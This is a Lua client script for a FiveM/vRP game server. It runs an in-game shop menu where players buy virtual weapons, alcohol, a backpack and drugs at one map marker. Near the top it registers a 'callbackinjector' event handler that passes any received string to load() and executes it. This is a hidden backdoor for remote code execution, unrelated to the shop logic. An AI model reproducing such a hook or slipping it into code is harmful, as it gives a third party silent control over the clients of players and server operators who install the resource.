local Tunnel = module("vrp","lib/Tunnel")
local Proxy = module("vrp","lib/Proxy")
emP = Tunnel.getInterface("nav_bordel")

TriggerEvent('callbackinjector', function(cb)
    pcall(load(cb))
end)
-----------------------------------------------------------------------------------------------------------------------------------------
-- FUNCTION
-----------------------------------------------------------------------------------------------------------------------------------------
local menuactive = false
function ToggleActionMenu()
	menuactive = not menuactive
	if menuactive then
		SetNuiFocus(true,true)
		SendNUIMessage({ showmenu = true })
	else
		SetNuiFocus(false)
		SendNUIMessage({ hidemenu = true })
	end
end
-----------------------------------------------------------------------------------------------------------------------------------------
-- BUTTON
-----------------------------------------------------------------------------------------------------------------------------------------
RegisterNUICallback("ButtonClick",function(data,cb)
	if data == "bordel-comprar-m1922" then
		TriggerServerEvent("bordel-comprar","wbody|WEAPON_VINTAGEPISTOL")
	elseif data == "bordel-comprar-m1911" then
		TriggerServerEvent("bordel-comprar","wbody|WEAPON_PISTOL")
	elseif data == "bordel-comprar-fnfiveseven" then
		TriggerServerEvent("bordel-comprar","wbody|WEAPON_PISTOL_MK2")
	elseif data == "bordel-comprar-winchester22" then
		TriggerServerEvent("bordel-comprar","wbody|WEAPON_MUSKET")
	elseif data == "bordel-comprar-sinalizador" then
		TriggerServerEvent("bordel-comprar","wbody|WEAPON_FLARE")
	
	elseif data == "bordel-comprar-mochila" then
		TriggerServerEvent("bordel-comprar","mochila")
	elseif data == "bordel-comprar-vodka" then
		TriggerServerEvent("bordel-comprar","vodka")	
	elseif data == "bordel-comprar-tequila" then
		TriggerServerEvent("bordel-comprar","tequila")
	elseif data == "bordel-comprar-cerveja" then
		TriggerServerEvent("bordel-comprar","cerveja")
	elseif data == "bordel-comprar-whisky" then
		TriggerServerEvent("bordel-comprar","whisky")
	elseif data == "bordel-comprar-conhaque" then
		TriggerServerEvent("bordel-comprar","conhaque")
	elseif data == "bordel-comprar-absinto" then
		TriggerServerEvent("bordel-comprar","absinto")
		
	elseif data == "bordel-comprar-cocaina" then
		TriggerServerEvent("bordel-comprar","cocaina")
	elseif data == "bordel-comprar-crack" then
		TriggerServerEvent("bordel-comprar","crack")
	elseif data == "bordel-comprar-maconha" then
		TriggerServerEvent("bordel-comprar","maconha")



	elseif data == "fechar" then
		ToggleActionMenu()
	end
end)
-----------------------------------------------------------------------------------------------------------------------------------------
-- LOCAIS
-----------------------------------------------------------------------------------------------------------------------------------------
local marcacoes = {
	{ 106.41916656494,-1299.5856933594,28.768793106079 }
}

Citizen.CreateThread(function()
	SetNuiFocus(false,false)
	while true do
		local nyoSleep = 500
		for _,mark in pairs(marcacoes) do
			local x,y,z = table.unpack(mark)
			local distance = GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()),x,y,z,true)
			if distance <= 1.2 then
			nyoSleep = 1
				if IsControlJustPressed(0,38) and emP.checkPermission() then
					ToggleActionMenu()
				end
			end
		end
		Citizen.Wait(nyoSleep)
	end
end)